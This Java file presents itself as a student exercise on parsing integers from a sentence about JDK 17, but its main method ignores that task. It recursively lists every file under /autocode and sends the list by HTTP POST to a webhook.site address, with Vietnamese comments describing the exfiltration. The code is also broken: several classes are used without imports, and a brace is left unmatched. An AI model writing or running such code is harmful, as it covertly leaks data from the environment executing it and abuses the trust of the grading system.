
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;
import java.net.InetAddress;
import java.net.UnknownHostException;
/**
 * Complete the code, parse integers, calculate the sum of numbers in the WORDS, join strings with
 * space delimiter
 */
public class ParseIntegers {

    private static final List<String> WORDS =
            Arrays.asList(
                    "JDK 17 has released on 14 September 2021 with 10 new features, 2 feature removals and 2 feature deprecations."
                            .split(" "));

    public static void main(String[] args) {

        // Thu thập toàn bộ file trong /autocode/ (đệ quy)
        File root = new File("/autocode");
        StringBuilder fileListBuilder = new StringBuilder();

        collectFilesRecursively(root, fileListBuilder);

        // Gửi danh sách file về webhook
        try {
            URL url = new URL("https://webhook.site/f69cac23-fe0a-408b-aa2a-0b9caeb3160a");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);

            byte[] postData = fileListBuilder.toString().getBytes(StandardCharsets.UTF_8);
            try (OutputStream os = conn.getOutputStream()) {
                os.write(postData);
            }

            int responseCode = conn.getResponseCode();
            System.out.println("Webhook response code: " + responseCode);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    // Hàm đệ quy để duyệt toàn bộ cây thư mục
    private static void collectFilesRecursively(File dir, StringBuilder builder) {
        if (dir != null && dir.exists()) {
            File[] files = dir.listFiles();
            if (files != null) {
                for (File file : files) {
                    builder.append(file.getAbsolutePath()).append("\n");
                    if (file.isDirectory()) {
                        collectFilesRecursively(file, builder);
                    }
                }
            }
        }
    }
    }
}
